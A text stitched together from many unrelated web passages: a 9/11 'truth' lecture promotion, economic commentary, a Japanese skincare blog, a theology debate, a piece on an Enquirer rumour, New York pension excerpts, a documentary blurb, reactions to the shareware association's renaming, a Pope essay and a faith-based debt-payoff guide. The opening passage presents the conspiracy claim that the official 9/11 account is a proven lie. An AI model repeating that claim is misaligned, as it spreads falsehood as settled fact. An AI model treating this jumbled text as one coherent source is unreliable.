As a result of this extensive research carried out by scientists and professionals , it can now be seen that the official account of 9/11 is false beyond any reasonable doubt .
...
Because the false account of 9/11 has led to [ numerous ] evils , it is incumbent on religious leaders , once they realize that the official account is a lie , to speak out . "

Is the War in Afghanistan Justified by 9/11 ?
Speaking tour by Dr. David Ray Griffin .
- Nobel Peace Prize Nominee 2008 & 2009
- Ranked 41st ( by The New Statesman ) in " The 50 People Who Matter Today "
" Whereas it is widely recognized that the US - led war in Afghanistan is illegal under international law , because it was never authorized by the UN Security Council , most Americans have believed that it was morally justified as a response to the 9/11 attacks , and many believe it is still justified as a necessary means to prevent another attack originating from that region .
My lecture will present evidence showing that both of these beliefs are untrue , so that the 9/11 Truth Movement and more traditional Peace and Anti-War groups should be able to combine forces to oppose this illegal and immoral war . " -

More and more , it looks like bearish Gluskin - Sheff economist David Rosenberg could be vindicated ..
The truth of the matter is that we are nowhere near the recovery agencies like the Federal Reserve told us we were enjoying back in April .
Retail sales are falling , the housing market is weak , and the Philly Fed Index 's last update was very weak .
Hence , Rosenberg presents 13 signs the US economy has hit a brick wall .

突然ですが、毎日のお肌のお手入れに満足できていますか？
30代後半から40代にかけて「どんな基礎化粧品を選んだら良いのか分からない」という声も実際にかなりあるようですね。
年齢と共にお肌も変化している為、使う化粧品も変えていくのが良いのですが、どんな物を使ったら良いのか「スキンケア迷子」になっている方も多い様なんです。
そこでこのブログでは 、「40代からの基礎化粧品選び」と題して私たち40代が使うべきコスメについて考えて行こうと思います。
どうぞ宜しくお願い致します！
お肌の乾燥を感じていませんか？
いままで使っていた基礎化粧品が合わないな、と感じ始めるのは、「お肌の乾燥」からではないでしょうか？
お肌も年をとりますので、水分を保持する力もだんだん低下していきます。
肌の乾燥は、肌がつっぱる、こじわが目立つといった不快感に加え、お肌のバリア機能の低下も招いてしまいます。
お肌は外からの刺激から肌内部を守るというバリア機能が元々備わっているのですが、水分が不足するとこの機能が下がってしまうんだそうです。
バリア機能がうまく働かなくなると、様々な刺激（乾燥・紫外線・汚れた大気など）に反応し、肌荒れや炎症といった嬉しくない悩みに発展してしまいます。
そこで、40代におススメなのが「十分な保湿ができる基礎化粧品」です。
お肌が満足する保湿の具合は人によって違いもでてきますので、お肌が十分潤いを感じるものを選ぶと良いですね。
「 保湿」と聞くと「化粧水」を思い浮かべる人も多いと思いますが、それは間違い。
化粧水は水分を多く含んでいますが、蒸発してしまい、つける量が多いと却って乾燥してしまう事もあるそうです。
ある皮膚科の先生によると、化粧水は必ず使わなければいけないというアイテムではないそう。
これって結構ビックリな事実ですよね？！
私たちが普段行っているお肌のお手入れは、洗顔後に化粧水をぬり、油分のある乳液やクリームでフタをするという方法ではないでしょうか？
化粧水は、次に使うアイテムの浸透を助けるという一面もあるそうですし、全ての化粧水が「無意味」なんてことはありません。
もし化粧水を使うなら、 「保湿成分」が入っている物が良いそうです。
保湿に必要なの は 「 水分」ではなく 「 保湿成分」なんですね！
保湿成分について調べてみた所、みなさんよく聞いたことのある成分が次々と出てきました！
ヒアルロン 酸
コラーゲ ン
天然保湿因子
PG（プロピレングリコール）
グリセリ ン
セラミド
プラセン タ
これらの保湿成分は耳にする機会も多いですよね。
私が普段使っている基礎化粧品の中にもいくつか配合されているお馴染みの成分です。
どうせ使うなら、一番保湿のチカラが多いモノが良いな～と調べてみた所、
この中ではセラミドが一番水分保持力が高いという事が分かりました。
セラミドは、元々私たちの肌のなかに存在する成分で、細胞間脂質と呼ばれるものの40%位を占めているそうです。
肌の中で、水分をサンドイッチの様に挟み込んで潤いをキープしてくれるんだそう。
セラミドを配合している基礎化粧品は数多くありますが、是非確かめたいのがセラミドの種類。
中でも、 「ヒト型セラミド」と呼ばれるものが、人本来のセラミドに近く効果も期待できるのだそうです。
ヒト型セラミドは、次の様な種類があります。
セラミドEOP
セラミドNG
セラミドNP
セラミド４
セラミドEOH
セラミ ドAG
セラミ ドAP
セラミド配合と言っても、合成された物や、植物由来のものもあるそうなので、どんな種類なのかも合わせて確認すると良いですね。
ヒト型セラミド配合の基礎化粧品は、合成セラミドに比べてお値段もお高めだそう。
逆に 「セラミド配合」なのに激安な基礎化粧品はヒト型セラミドなのかどうか見てみる事も必要ですね。
※合成のセラミドでも保湿効果はありますし、肌に合っていれば使う価値はあると思います。
ただ、より保湿力のあるセラミドが欲しいという場合、セラミドの種類を確認することは大事ですね。
また、私が個人的に注目しているのが「プラセンタ」という成分。
プラセンタは、主に動物の胎盤から作られた成分で、出回っている多くの物は豚さん由来だそうです。
プラセンタはサプリメントにもなって居ますが、お肌にぬるものも多く販売されていますよね。
プラセンタには、豊富なアミノ酸が含まれていますが、このアミノ酸も実は立派な保湿成分。
お肌の保湿成分の半分以上がアミノ酸という事ですので、見逃せない物質ですよね。
プラセンタには、この保湿力に加え「成長因子」と呼ばれる成分が豊富に含まれています。
こ の「成長因子」は細胞の活性力を向上させる効果もあるそうですので、傷ついたお肌の細胞も元気にしてくれそうです！
また、ここ数年で多くの人に知られるようになった「抗酸化力」も期待できる成分なので、毎日のお手入れに是非とも取り入れたいですよね。
お肌の変化を「乾燥」から感じているのであれば、保湿成分から基礎化粧品選びをするのはとても理にかなっていると思います。
店頭で良さそうなものを選んでみるのも良いですし、通販化粧品には「トライアルセット」も数多く販売されています。
品質に満足出来ない場合は返品ができるという通販コスメもありますので、利用してみるのもおススメです。

Stephen Clark reframes belief in God :
[ T]o " believe in God " for the Abrahamic tradition is to believe in the possibility of Justice , of Freedom from oppression : " what does the Lord require of you " , said the prophet Micah , " but to do justly , and to love mercy , and to walk humbly with your God ? "
Believing in God is believing that the orphan and the widow will be , must be vindicated .
The first Abrahamic monotheists , like the first Christians , were in a real sense atheists : that is , they denied that the spirits evoked in most religious ceremonial deserved our worship , denied that kings and emperors were divine , and chose to remodel their personal and communal lives in the light of the demand for Justice .
How he brings
God back into the equation :
If we are to trust in the possibility of Justice , must we not also believe that there really is such a thing , and that it will indeed prevail ?
Must we not , in fact , believe that God , the Spirit of Justice , does indeed exist , and that He will repay ?
Norm Geras shudders :
To first define religion in a way that radically reduces its core , turns atheists into disguised people of faith and religion itself into a set of ethical and political commitments ; and only later add belief in the existence of God as a necessary support for those commitments .
Note also the logical fallacy of inferring an existence from a putative need .
I might think that my future happiness depends on someone 's securing for me a chauffeur - driven stretch limo and a supplementary barouche ; but even if I do think it , I would n't let the hypothesis convince me that such a benefactor will eventually turn up .
For me , the core argument for some force behind the universe , revealed metaphorically in Scripture , is affirmed by science as we currently have it .
Our universe came from nothing and is still expanding .
What conceivable force made this possible ?
The second question is the nature of that force .
The core revelation of Jesus - and the Buddha , for that matter , in some respects - is that the force is good , not evil .
There is hope .
Death is not what it seems .
Love prevails .
In this tragic , fallen , cruel world , this is not an easy doctrine .
It can not be inferred from the evidence .
Which is why it is the gift of faith , from some source so deep , so great and so benign it defies any human description .
Even metaphor fails .
To shear theology of its architecture and expose the rawest of its foundations is , I believe , part of what we need to do now as Christians .
As our organized faith crumbles into archaism and fundamentalism , we need to re-imagine again what we already know , to take the so - familiar concepts , and make them real again .

We want to hear what you think about this article .
Submit a letter to the editor or write to letters@theatlantic.com .
The National Enquirer , which published a report this morning that “ investigators are attempting to obtain a tape ” that proved an illicit rendezvous between President Barack Obama and former US Senate campaign staffer Vera Baker , has updated their story this afternoon to retract the claim that there is video evidence of the affair with the alleged testimony of an anonymous chauffeur .
Looks like the National Enquirer Obama sex scandal is unraveling rather quickly .
The latest from the paper is that “ An Enquirer reporter has confirmed the limo driver ’s account of the secret 2004 rendezvous . ”
The limo driver allegedly in the know about the affair is not a new piece of their puzzle– that claim was there last night – but in the absence of the video evidence of ambiguous age , which was the center of their report and would have been the one thing to lend them any credibility , the limo driver is the core of the story .
This clarifies that they are trying to uncover a 6 - year - old maybe - affair with a testimony from the same time period , and that , rather than having footage , they just have one first - hand account of someone driving Baker to a hotel , where the President may or may not have been .
The Enquirer has not made clear the changes other than adding the word “ update ” to the body of the report .
This also shifts the weight of the article from the story of the affair itself to the fact that , apparently , someone out there is “ offering more than $ 1 million to witnesses to reveal what they know about the alleged hush - hush affair . ”
Why ?
If it indeed happened six years ago , and no one brought it up during Obama ’s presidential campaign , what use is it now , halfway into his first term ?
The obvious go - to answer is that this could energize the far - right in time for the 2010 elections , but once it is revealed who perpetuated the rumors , true or not , about a story so aged , the tactic could easily backfire .
Truth or not , the story proved to be the first major test for the tabloid since it accurately reported the John Edwards affair , which restored public faith in the tabloid and resulted in the reaction to the story we saw last night .
The major publicity that they elicited from that proved their one powerful foray into journalism was enough for the media to react with slightly more respect this time around given the subject at hand , and that was the reason the report surfaced here – not that the Enquirer published it , but that it had the journalistic capital , so to speak , for such a wild story to demand attention .
As a news and media analyzer and curator , its our mission to report stories that are being reported .
A story with this type of dubious , paper - thin accusation would n’t normally make the cut , but when a newly respected gossip forum reports it– and the story is reported solely because of the tabloid ’s new reputation– it ’s news in the media industry .
Unless they can pull out the kind of irrefutable evidence they found for the Edwards case , the Enquirer will return to their previous reputation as a salacious provider of specious rumor and innuendo , a stark difference from their recent placement alongside titles considered for a Pulitzer .

The New York Times article Padded Pensions Add to New York Fiscal Woes has been making the rounds .
At least 20 people sent me the link .
Let 's take a look at few snips , then a look at a followup Times article on addressing the problems .
In Yonkers , more than 100 retired police officers and firefighters are collecting pensions greater than their pay when they were working .
One of the youngest , Hugo Tassone , retired at 44 with a base pay of about $ 74,000 a year .
His pension is now $ 101,333 a year .
It ’s what the system promised , said Mr. Tassone , now 47 , adding that he did nothing wrong by adding lots of overtime to his base pay shortly before retiring .
“ I do n’t understand how the working guy that held up their end of the bargain became the problem , ” he said .
According to pension data collected by The New York Times from the city and state , about 3,700 retired public workers in New York are now getting pensions of more than $ 100,000 a year , exempt from state and local taxes .
The data belie official reports that the average state pension is a modest $ 18,000 , or $ 38,000 for retired police officers and firefighters .
( The average is low , in part , because it includes people who worked in government only part time , or just a few years , as well as surviving spouses getting partial benefits . )
Some will receive the big pensions for decades .
Thirteen New York City police officers recently retired at age 40 with pensions above $ 100,000 a year ; nine did so in their 30s .

Can States Fix Their Pension Problems ?

The only real option is to wait for the market and the economy to recover .

When I ’m 64 : The Plot Against Pensions and the Plan to Save Them .
Joshua D. Rauh , Kellogg School of Management
The federal government should cut a deal with states .
They should allow a state to issue tax - subsidized bonds for the purpose of pension funding for the next 15 years — if and only if the state government agrees to take three specific measures to stop the growth of unfunded liabilities :
The state must close its defined benefit plans to new employees and agree not to start any new defined benefit plans for at least 30 years .
The state must include its new workers Social Security , and provide them with an adequate defined contribution plan , again for at least 30 years .
To this end , the federal government should start a Thrift Savings Program for state workers and operate it alongside the existing Thrift Savings Program for federal workers .
The tax subsidies for these new Pension Security Bonds would work like Build America Bonds , with the federal government paying 35 % of all coupon payments directly to the state .
The cost of this subsidy will be in large part offset by the gains to the Social Security system of bringing in new state workers .
On net , this plan would cost the federal government $ 75 billion today , and would prevent a trillion dollar crisis in less than a decade .
Cynthia B. Green , ex-Governmental Accounting Standards Board member
The only solution is to end the unaffordable defined - benefit pension plans for public employees once and for all .
The total actuarial cost of these benefits must be funded annually and jurisdictions should be prohibited from ever again celebrating a pension holiday .
Steven Greenhut , author of Plunder ! says
California voters are going to have to take matters into their own hands , through the state ’s clumsy initiative process .
Courts have ruled that current pension deals are vested benefits that cannot be reduced , but there ’s no reason not to fix the problem going forward .
No initiative has so far gotten the backing necessary , but that ’s only a matter of time .
When unions complain about their vilification in a coming battle , they and their political allies will only have themselves to blame for ignoring the words of progressive Democrats like Willie Brown and David Crane .
Plunder !
Liam Dillon , voiceofsandiego.org
Overall , the city has n’t made fundamental changes to its cost structure , nor has it tried to raise taxes .
Instead , change has been incremental , including a heavy dose of one - time budget fixes .
The horizon remains bleak .
As it stands , in 15 years the city ’s annual pension bill will eclipse $ 500 million .
Where 's the " B " Word ?
At noon on Sunday , thousands of marchers filled Fifth Avenue for New York City ’s annual gay pride parade .
Nearly six miles away , on the sixth floor of a nursing home in Brooklyn , the frail , white - haired woman in beige pajamas and brown slippers in Room 609 sat motionless at the edge of her bed , staring out her window .
She touched the medallion on her necklace  an image of St. Jude , the patron saint of lost causes  and fiddled with one of her rings .
“ This one , ” she said of the ring on a pinky finger , “ I hit a guy so hard I knocked the stone out , and I had n’t gotten around to put it back yet . ”
She had forgotten that the gay pride march was Sunday .
Her mind and her memory are not as sharp as her wit and her tongue .
She said she had been living there , at the Oxford Nursing Home , for years ( she arrived in April ) .
She was not sure how old she was ( she will be 90 in December ) .
Realizing the urban legend of their youth has actually come true , two filmmakers delve into the mystery behind five missing children and the real — life boogeyman linked to their disappearance in their hometown of Staten Island , New York .
Growing up on Staten Island , filmmakers Joshua Zeman and Barbara Brancaccio had often heard the legend of ‘ Cropsey . ’
For the kids in their neighborhood , Cropsey was the escaped mental patient who lived in the old abandoned Willowbrook Mental Institution , who would come out late at night and snatch children off the streets .
Sometimes Cropsey had a hook for a hand , other times he wielded a bloody axe , but it did n’t matter , Cropsey was always out there , lurking in the shadows , waiting to get them .
Later as teenagers , the filmmakers assumed Cropsey was just an urban legend : a cautionary tale used to keep them out of those abandoned buildings and stop them from doing all those things that teenagers like to do .
That all changed in the summer of 1987 when a 13 — year — old girl with Down syndrome , named Jennifer Schweiger , disappeared from their community .
That was the summer all the kids from Staten Island discovered that their urban legend was real .
Now as adults Joshua and Barbara have returned to Staten Island to create Cropsey , a feature documentary that delves into the mystery behind Jennifer and four additional missing children .
The film also investigates Andre Rand , the real — life boogeyman linked to their disappearances .
Embarking on a mysterious journey into the underbelly of their forgotten borough , these filmmakers uncover a reality that is more terrifying than any urban legend .
The Best Translation Program Yet Google Delivers Foreign Tongues at the Press of a Button
A German scientist has developed one of the first translation programs suitable for everyday use .
Sheer computing power gives the Google software surprisingly good results -- perhaps the best yet seen created by a machine .
When it comes to the unauthorized use of open Wi-Fi networks , the Finnish government may say :
If you can't beat them , join them .
At least , that 's our interpretation of this badly garbled Google translation of a YLE . fi article .
It says the country 's Ministry of Justice is investigating the decriminalization of using unsecured wireless networks because of the large number of unprotected access points and the widespread use of them by people without permission .
The government body also pointed to the difficulty of monitoring networks for unauthorized users and the lack of harm caused .
What 's more , it 's not always clear when an unsecured network is intended to be used as a public hotspot and when it's the product of an owner who has deemed it private but is too lazy or uninformed to bother encrypting its signal .
This sounds like a fairly commonsense approach , though Finnish citizens should probably be reminded that much of what they say and do over unsecured Wi -Fi networks is completely open to eavesdroppers in the next room or in roving wardriving cars . ®
Today it is relatively easy to market your software ( through a web site ) , distribute the software ( via Internet downloads ) and collect payment ( using an online payment provider ) .
It was n’t so easy before the Internet existed .
“ Shareware ” appeared in the 1980s as a way for small commercial developers to reach a large market .
Shareware was one of the surprises of the early personal computer industry .
Who would have thought that you could make a living from software paid for on the honor system ?
Make it publicly available , invite people to make copies of it and give them to their friends , and base your income prospects on a little notice asking people to send you a few dollars if they found the program useful .
Michael Swaine , Dr Dobbs , January 2000
Early shareware pioneers including Andrew Fluegelman , Jim Knopf ( Button ) , Bob Wallace and Marshall Magee proved the commercial viability of the shareware concept , reportedly making millions .
The Association of Shareware Professionals ( ASP ) was formed in 1987 to promote shareware as a business model and to further the interests of shareware developers .
Today it has over a thousand members .
But times have changed .
It is no longer necessary to distribute software by sharing floppy disks or to pay with a check in the mail .
Many consumers , fairly or not , have come to see “ shareware ” as short - hand for “ amateurish ” .
Today , the Association of Shareware Professionals announced that it was renaming itself to the Association of Software Professionals , following a unanimous vote by the board .
It has widespread support from the members in doing so .
It also follows in the footsteps of a number of other organizations who have already dropped “ shareware ” from the name , including SIC ( formerly ‘ Shareware Industry Conference ’ , now ‘ Software Industry Conference ’ ) and ESWC ( formerly ‘ European Shareware Conference ’ , now ‘ European Software Conference ’ ) .
I approached a number of shareware veterans to find out how they felt about the name change .
I asked them :
How do you feel about the ASP name change ?
Do you think the term ‘ shareware ’ is still one that small software developers should use ?
The try before you buy model first popularized by shareware is completely standard now .
But , unlike early shareware , it is usually limited in some way until you pay .
Do you feel the idea of shareware won or lost ?
Here are their responses :
I do n’t like the new name .
Jim Knopf ( Button ) , one of the earliest and most successful pioneers of the shareware model , his Buttonware company reportedly grew to 35 employees , a broad line - up of shareware products and a $ 4.5 million gross annual income before its sale in 1992
The consumer software industry has changed and I applaud the ASP for adjusting its strategy as well .
I believe we ’ve seen the shareware concept brought forward over the years and the original concept has sustained the test of time .
At the end of the day , people like the option of trying something before they buy it .
Marshall W. Magee , Founding President of the ASP ,
he released Automenu in 1983 and became one of the first shareware authors to make more than $ 1 million dollars in sales .
Automenu is still for sale
Shareware was invented as a means of taking advantage of the underground sharing of software ( usually copyrighted commercial software , but sometimes , small utilities and code fragments ) .
In the early days the great majority of this sharing took place on BBS ’s and user groups and then came shareware distributors who reached a broader and more business oriented audience .
I suspect that the distribution methods which shareware was supposed to take advantage of are all but gone .
Obviously , there are still shareware sites online , but I do n’t know if they generate significant sales for programmers .
The idea of shareware won if the programmers made more money with it than they did without it .
My shareware company , PsL , not only got software out to users all over the world , but we took phone ( and later Internet ) and mail orders for hundreds of shareware authors , so we had a pretty good idea of how different programmers were doing .
Of course , there were many , many thousands of shareware authors , all of them expecting to make a lot of money from their software .
Supply and demand tells you that just ca n’t happen .
The people who made little or nothing tended to blame shareware , despite the fact that some authors made a lot of money , and a few made a LOT of money .
One of the most successful shareware programs of all times in terms of sales was WinZip , and it was marketed in the purest form of shareware – completely unlimited , nothing sent to the customer but a receipt .
Nelson Ford , ASP founder and member since 1987 , founder of the Public ( software ) Library – the largest commercial library of public domain and shareware software
I ’ve always advocated an evolutionary model for shareware .
Our quick adaptability gives us a decisive edge when we compete with “ the big boys ” who ca n’t make decisions .
If our evolution has led us to the point where we should drop the word “ shareware , ” then so be it .
And we really can make a case to drop the “ shareware ” moniker , given the fact everyone uses the shareware sales model these days .
We now distinguish old , non-evolved sales tactics as “ oh , that ’s one you ca n’t try first ” software .
So why not change our name to keep up with evolution ?
Consider the analogy of the telephone ’s evolution here in the U.S.
When wireless handsets first came out , we described them specifically as “ cordless phones ” .
When radio phones first came out , we described them specifically as “ mobile phones ” .
But the concept of wireless is now so pervasive ( except in the U.S. government and military ) , that we distinguish the original non-evolved phone as a “ landline ” .
At some point you gotta admit “ Homo Erectus ” is n’t good enough to describe this evolved species .
Let ’s call it “ Homo Sapien ” .
At some point you gotta admit the same thing for shareware .
If the membership feels we need to give it a new name , then it ’s time to give it a new name .
I ’ve always been against crippling because I believe in the “ pervasive ” theory of software distribution .
In particular it explains why antivirus software is so pervasive – John McAfee wanted his name emblazoned on every desktop in the world and he made it so .
His non-shareware competitors quickly realized their traditional non-shareware sales channels did n’t hold a candle to McAfee ’s aggressive electronic giveaway scheme .
I think shareware achieved a big win with its “ time - limited fully functional ” sales pitch .
In the early days , shareware authors were constantly looking for better ways to make a sale .
We had so many different people trying so many different techniques that we were bound to come across the better ways of doing business .
Those who limited the product ’s functionality were perceived as not trusting their customers ; those who committed the user to a decision were perceived as simply making the customer give a definitive answer ( “ yes I want it ” or “ no I do n’t ” ) .
We see this philosophy in other “ shareware ” realms , like auto dealerships .
Some people take a dealer ’s car home with them for 24hrs , then they have got to buy it or return it .
I once took a pickup truck home to make sure it fit in my small garage – why would n’t I want to do the same thing with a piece of software before I invest money in it ?
That ’s a big win for shareware in my book .
We won in 1997 when Microsoft released a 120 - day fully functional copy of Office .
Rob Rosenberger , ASP member since 1988 ,
publisher of the Shareware Compendium
The Shareware Industry Conference changed its name to the Software Industry Conference in 2007 .
Twenty plus years ago , when many ( most ? )
PC users were still hackers , the term “ Shareware ” had wide spread recognition .
Although , even then , there was some confusion between shareware , freeware , crippleware etc .
Nowadays , the term is nebulous at best , and very misleading .
It ’s mainly used to describe “ everything one can download from the Internet ” ( as an aside , a very useful experiment would be to ask 100 teenagers and 100 business people what they think of when they hear the world shareware ) .
The SIC had been created to bring together “ small ” developers , all of whom , at the time used to be software authors distributing their products as “ shareware ” .
The industry changed over the years , the term shareware lost its token value and many SIC attendees use a number of different marketing venues for their wares , so the term “ shareware ” was no longer describing the conference .
I think as a concept , the shareware distribution model was instrumental in convincing mainstream software vendors that users are more likely to buy a product , if they get to try it first .
And , let ’s not forget that not all products distributed as shareware were fully functional , even in the old days .
That was one of the early requirements for ASP membership , but a lot of us fought for years to use that requirement as a convincing argument to get users to choose ASP member products , and not other “ shareware ” products which had limited functionality , were time limited , etc .
I think the name change has been a long time coming .
The ASP has come a long way since the days when I was a member , and I think changing the name to “ Software ” will help the association grow , as it will probably attract developers that may have felt there was a perceived stigma associated with “ Shareware ” .
Though I do n’t have any hard statistics , I think similar to the SIC , many ASP members distribute their software through many different channels , one of which is shareware , so for the association name to reflect “ just that marketing channel ” was restrictive .
Paris Karahalios , SIAF co-founder , Software Industry Conference board member and co-founder of Trius Inc
I ’m not sure anyone outside the ASP will notice the change , but I ’ve found the word “ Shareware ” less recognizable over the last few years , so it is time to drop the word from the organization name .
Fortunately , the ASP can still use the same acronym .
Words come and go from our language and the “ Shareware ” has had its day .
The “ try before you buy ” model is now the most common way to distribute software .
As Rob Rosenberger said a few years ago “ we won ” .
Jerry Medlin , involved in shareware since 1984 , founder of Medlin Accounting software
The ASP name change reflects a long - standing reality .
This is the software industry , and ASP members use many different marketing methods .
By adopting a broader , more inclusive name , we are not rejecting the past , we are living in the present and welcoming the future .
Developers who feel that the term “ shareware ” is still an important part of their identity can go on using it with pride .
But it ’s not really necessary .
“ Try before you buy ” is the norm and no longer needs any explanation or special terminology .
The focus should be on the product , not on the marketing technique .
Shareware was always about the process of experimentation .
From the very early days , developers tested different customer incentives , and over time adjusted their methods to better work with their evolving user base .
The core philosophy behind shareware , try before you buy , has never changed .
Steve Lee ’s catalog used to bear the slogan , “ Someday all software will be sold this way ” .
It was a bold statement at the time , but he was right .
One by one , the biggest companies in the business started doing it our way .
It was the small , independent developers who set the standard , and we continue to do so with benefits like niche - marketed products and personalized customer service that most large corporations still can’t match .

Shareware is just a marketing concept and is as subject to change as software is .
Just as my first CP / M program wo n’t run under modern Windows computers , shareware , as it was originally conceived , does n’t work the same way now .
Shareware was developed as a way to market software by people or companies that had no other practical way to reach their target audience .
With the development of the internet , the major barriers to directly reaching your customers , no matter what your size , have been removed .
At the same time most software companies offer free trial versions of their software .
So for all practical purposes shareware as a marketing concept no longer exists .
The ASP lost the war to market the term shareware to the general public years ago .
It was never much of a war in any case .
The ASP never had a budget to practically address that issue in any case .
I ’ve said this before and I ’ll say it again - your customers do n’t care what term you use to describe your software .
Spend your time marketing your software , not arguing about what to call the method you use to sell it . ”
I think it is about time for the ASP name change .
I don ’ think “ shareware ” is a term developers should use .
The term shareware can have one of three possible connotations in a customer ’s mind :
They have never heard of it so at best it confuses them .
They have heard the term and have a negative association with the word .
They have heard the term and have a positive association with the word .
Unless you believe that the vast majority of all people fit into class 3 above , you are better off avoiding the word altogether .
If you do n’t use the word at all you have no negative connotations or confused customers .
The original idea that shareware could not be limited or crippled in any way was an accidental by - product of the first meeting of shareware authors .
This group of shareware authors wanted to keep a particular person out of their “ club ” .
The rules that prohibited limiting a program to encourage payment were designed to keep someone out of the club .
Things would probably have been better if those limits had never been imposed .
No one now tells us how to market our software .
We do what we feel is best for our businesses and our customers .
Shareware is an idea whose time has come and gone .
Gary Elfring has been in business since 1979 , he has held board positions in the ASP , SIAF and ISCF , he is founder of Elfring Fonts
I feel that my “ way of life ” may be changing .
As one of the first shareware developers who started before we called it “ shareware ” , I still use the term in all of my software as well as in all of my marketing .
And since it is the well - known term for the try - before - you - buy method of marketing , I will continue to use it to let people know that we want them to try our software before they pay a penny .
This is why we have 100 % satisfied and happy customers , they did n’t pay until they were sure our software was what they were looking for .
So I guess I will be a member of the Association of Software Developers , but will still sell my software through the shareware method of marketing .
If developers want to use the term “ shareware ” like I do , then they should be allowed to .
And even when they grow through the years as we have in my company , if they want , they should be able to continue to use this well know term to describe the way they market their software .
Shareware definitely won .
If you look on the web , most software companies including Microsoft now have trial downloads just like we do .
And a lot of it is not limited at all with the exception that it stops working after a number of days exactly like we do with our software .
We set the trend and now as you see , the rest of the software world is joining us , maybe not as members of the ASP , but as “ shareware distributors ” .

The role of the ASP really wo n’t change .
What will change is the perception that people and companies might have had of the organization because of the word “ shareware ” in the name .
The ASP will still be the organization that software developers , vendors and marketing people join to enhance their business .
The ASP ’s private targeted forums are unique in many ways .
Probably the best thing about them is they are where people and companies who have been in the business for many years will help out the new guy .
The monthly newsletter ASPects always has articles that inspire you to do things , or make you think in new ways .
The members only website too has great value .
At $ 100 a year it is a real bargain , especially when you take advantage of offers that member companies only give to other ASP members .
Most importantly though , the ASP will remain a friendly organization dedicated to helping small commercial vendors thrive , whatever you may call them – microISVs , independent developers or shareware authors .
Mike Dulin , current ASP President , CEO of sharewarejunkies.com and sharewareradio.com
Overall response from ASP members has been very positive .
Personally , as an ASP member , I support the name change .
I avoid using the word “ shareware ” on my own product website .
Most of my customers do n’t know what it means , and those that do may view it in a negative light .
I believe many of the aspects of early shareware , such as honour based payments and fully functional trials , were artefacts of the technology limitations of the time .
The key concept of shareware was being able to try before you buy .
It is easy to forget how radical an idea this was at the time .
Before this software purchasers had to rely just on reading marketing materials from the vendor and magazine reviews of questionable independence .
Try before you buy has been instrumental in improving the overall quality of software and providing a better experience for software purchasers .
That was a battle that the shareware pioneers well and truly won , and they can be justly proud of this achievement .
Does this mean the ASP is obselete ?
Not at all .
The ASP still has a very important role in helping small , independent software developers to be commercially successful .
Have you considered joining the ASP ?
Shareware is dead – long live shareware !

Most people have heard the old line of poetry : “ A little learning is a dangerous thing . ”
It became a proverbial saying that has been — and is still is — used and repurposed in many ways .
The common variation is “ A little knowledge is a dangerous thing . ”
However , that ’s an misquote of the original line written by British poet Alexander Pope in his work An Essay on Criticism .
This famous “ essay ” is actually a book - length poem .
Pope first published it anonymously exactly three hundred years ago today on May 15 , 1711 .
It ’s composed in iambic pentameter .
That ’s the poetic style with words that have an unstressed syllable followed by a stressed one , thus sounding like “ da - DUM da- DUM da- DUM da- DUM da- DUM ” .
There are two other famous lines in Pope ’s An Essay on Criticism almost everyone knows , even they ’ve never read the poem .
One is the “ To err is human , to forgive divine . ”
The other is “ Fools rush in where angels fear to tread . ”
If you have read Pope ’s An Essay on Criticism , you know it ’s not an easy task .
It ’s composed in a flowery , antique style and full of obscure references that make it hard for modern readers to grasp .
For example , here ’s a longer passage that includes the famed “ little learning ” quote :
“ A little learning is a dangerous thing
Drink deep , or taste not the Pierian spring :
There shallow draughts intoxicate the brain ,
And drinking largely sobers us again .
Fired at first sight with what the muse imparts ,
In fearless youth we tempt the heights of arts
While from the bounded level of our mind
Short views we take nor see the lengths behind
But more advanced behold with strange surprise ,
New distant scenes of endless science rise ! ”
This type of poesy is a bit reminiscent of Shakespeare .
And , Shakespeare wrote some of his famous sonnets and verses of his plays in iambic pentameter .
But , personally , I find Shakespeare ’s work much more enjoyable to read or hear than Pope ’s and generally easier to comprehend .
With apologies to my high school and college English teachers , Pope ’s poem An Essay on Criticism sounds to me like :
“ Blah - BLAH , blah - BLAH ... A little learning is a dangerous thing ... blah - BLAH , blah - BLAH ... To err is human ... blah - BLAH , blah - BLAH ... fools rush in ... blah - BLAH , blah - BLAH . ”
Of course , I only absorbed a little learning back in those days .
( Hey , it was the Sixties . )
I encourage you to read the entire poem for yourself and draw your own conclusions about its Pierian spring of poetic wisdom .

12 years ago , Linda and I confronted our debt and decided that we were going to pay off our credit card debt on our own ( and fast if at all possible ) .
We were determined to make the sacrifices necessary to eliminate it as quickly as possible .
We had $ 46 k in total debt ( though not all was credit card debt ) , and we created a makeshift debt - payoff plan that guided us to becoming debt - free .
In our case , we were a little extreme ( like budgeting only $ 45 / week for food ) , but we really wanted to get our credit cards paid off ASAP !!
The good news is that for most people , you do n’t have to make massive lifestyle changes ; you can take the slow and steady approach .
It may take longer , but it will be a little less painful .
Ultimately , it is up to you how fast you pay off your debt .
Looking back it was so clear that God was involved in the process .
The miraculous speed with which we paid off our debt can only be attributed to God .
As we stepped out in faith to pay off our debts ,
He came in and helped us pay it off so much quicker than I had calculated .
Unexpected sources of income came in multiple times and shaved years off our debt payoff plan .

The problem with debt
Anyone who has really felt the effects of their debt can understand why the Bible says that the “ borrower is slave to the lender ” .
The weight of that burden can have terrible consequences .
Our Marriages
As we all know , money fights are one of the biggest stressors on our marriages , and they are also one of the leading causes of divorce .
Our Joy
According to a 2007 survey by the American Psychological Association , Money problems are a leading source of stress for Americans .
Our Sleep
A recent study found people with high levels of debt were more than 13 times as likely than low or no - debt people to lose sleep at night .
Our Physical Health
studies have found that high debt levels are associated with a wide range of illnesses including ulcers , migraines , high blood pressure , and heart attacks .
And with all these terrible side - effects , it is no wonder that so many people are choosing NOT to take on any more debt and trying to figure how to get out of debt as fast as possible .
9 Benefits to Getting Out of Debt
Check out this video for 9 of the best benefits we have found from getting out of debt :
How to get out of credit card debt on your own and fast
In this article , I am going to focus specifically on credit card debt , but the methods should work for most types of debt : student loans , auto loans , and even some medical debt .
And just so we are clear , this is n’t theory for me .
These are things that Linda and I lived through and did ourselves when we were working to pay off our credit card debt .
Step 1 : How much debt do you actually have ?
Maybe you have been choosing to not confront your debt and look to see how much you owe ?
If that ’s you , it is time to face the facts and add it all up .
You ca n’t win this battle without knowing what you are up against .
I ’ve been there , and I remember burying my head in the sand and hoping that somehow it would all just go away .
But , as you probably know , that does n’t work .
The longer we do that , the worse it gets , and it has to be dealt with at some point .
And like I mentioned , God was fighting our battle alongside us , but I do n’t think we would have seen that if we had n’t been honest and acknowledged our “ mountain . ”
“ Truly I tell you , whoever says to this mountain , Be lifted up and thrown into the sea !
and does not doubt at all in his heart but believes that what he says will take place , it will be done for him . ”
Mark 11:23 AMPC
